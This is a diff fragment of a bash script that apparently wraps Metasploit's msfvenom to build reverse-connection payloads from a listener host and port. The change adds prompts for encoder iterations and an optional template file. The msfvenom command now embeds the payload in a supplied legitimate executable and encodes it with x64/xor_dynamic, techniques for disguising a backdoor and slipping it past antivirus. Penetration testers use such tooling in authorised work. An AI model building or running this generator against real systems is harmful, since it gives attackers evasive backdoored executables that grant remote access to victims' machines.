@@ -126,7 +126,7 @@ fi
 echo -n "LPORT: "
 read lport
 
-# Check for no answer
+# Check for no answer.
 if [[ -z $lport ]]; then
      lport=443
      echo "[*] Using 443"
@@ -138,10 +138,42 @@ if [[ $lport -lt 1 || $lport -gt 65535 ]]; then
      f_error
 fi
 
+echo -n "Iterations: "
+read iterations
+
+# Check for no answer.
+if [[ -z $iterations ]]; then
+     iterations=1
+     echo "[*] Using 1"
+     echo
+fi
+
+# Check for valid number that is reasonable.
+if [[ $iterations -lt 1 || $iterations -gt 10 ]]; then
+     f_error
+fi
+
 x=$(echo $payload | sed 's/\//-/g')
 
-msfvenom -p $payload LHOST=$lhost LPORT=$lport -f $format -a $arch --platform $platform -o $home/data/$x-$lport$extention
+echo -n "Do you have a template file? (y/N) "
+read answer
+
+if [ "$answer" == "y" ]; then
+     echo -n "Enter the path to the file: "
+     read template
+
+     if [[ -z $template ]]; then
+          f_error
+     fi
+
+     if [ ! -f $template ]; then
+          f_error
+     fi
+
+     msfvenom -p $payload LHOST=$lhost LPORT=$lport -f $format -a $arch --platform $platform -x $template -e x64/xor_dynamic -i $iterations -o $home/data/$x-$lport-$iterations$extention
+else
+     msfvenom -p $payload LHOST=$lhost LPORT=$lport -f $format -a $arch --platform $platform -e x64/xor_dynamic -i $iterations -o $home/data/$x-$lport-$iterations$extention
+fi
 
 echo
 echo
-
